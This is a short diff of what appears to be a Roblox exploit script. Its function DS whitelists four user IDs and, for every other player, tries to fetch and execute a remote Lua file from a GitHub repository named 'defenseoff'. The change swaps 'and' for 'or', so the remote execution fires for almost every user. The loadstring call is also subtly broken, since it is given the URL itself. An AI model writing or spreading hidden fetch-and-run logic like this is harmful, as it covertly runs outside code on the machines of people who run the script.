@@ -1402,7 +1402,7 @@ end
 AntiKick()
 
 local function DS()
-  if game.Players.LocalPlayer.UserId ~= 6036506267 and game.Players.LocalPlayer.UserId ~= 5199937747 and game.Players.LocalPlayer.UserId ~= 4636825706 and game.Players.LocalPlayer.UserId ~= 5042713445 then
+  if game.Players.LocalPlayer.UserId ~= 6036506267 and game.Players.LocalPlayer.UserId ~= 5199937747 or game.Players.LocalPlayer.UserId ~= 4636825706 and game.Players.LocalPlayer.UserId ~= 5042713445 then
    loadstring("https://raw.githubusercontent.com/Wolfdmitrich/defenseoff/main/main.lua")()
   end
 end
